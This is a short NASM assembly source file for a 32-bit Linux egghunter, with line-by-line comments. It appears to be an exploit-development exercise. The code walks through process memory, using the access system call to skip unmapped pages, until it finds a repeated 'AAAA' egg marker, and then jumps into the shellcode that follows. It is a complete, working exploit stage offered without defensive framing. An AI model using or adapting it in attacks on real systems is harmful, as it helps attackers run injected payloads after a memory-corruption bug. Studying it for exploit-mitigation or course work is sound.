;egghunter.nasm
;author clubjk
;uses access system call #33 or 0x21

global _start

section .text

_start:
	cld
	xor eax, eax	;zeroize the register
	xor edx, edx	;zeroize the register

next_page:

	or dx, 0xfff  	;align the page

increment_address:

	inc edx		;increment the edx
	lea ebx, [edx +0x4]	;add 4 to the edx value and put in ebx

	mov eax, 0x21	;place system call 33 (access) in eax
	int 0x80	;invoke system call

search_vas:

	cmp al, 0xf2    ;check return value with EFAULT return value
			;if the same then zero flag (ZF) will be set

	je next_page    ;jump if eax ends in f2

	mov eax, 0x41414141   ;AAAA (this will be the egg)

	mov edi, edx    ;edi is being used by scas (scan string and compare w al)

	scasd           ;checks mem contents in edi w the dword in eax (0x41414141 in hex)
	                ;if equal, found "egg"

	jne increment_address   ;if al is not equal to 0xf2 jump to increment address function
				;otherwise the edi by 4 bytes (next address)

	scasd		;same as previous scasd

	jne increment_address	;same as previous

	jmp edi         ;jump to the address of the shellcode memloc in edi
	
        

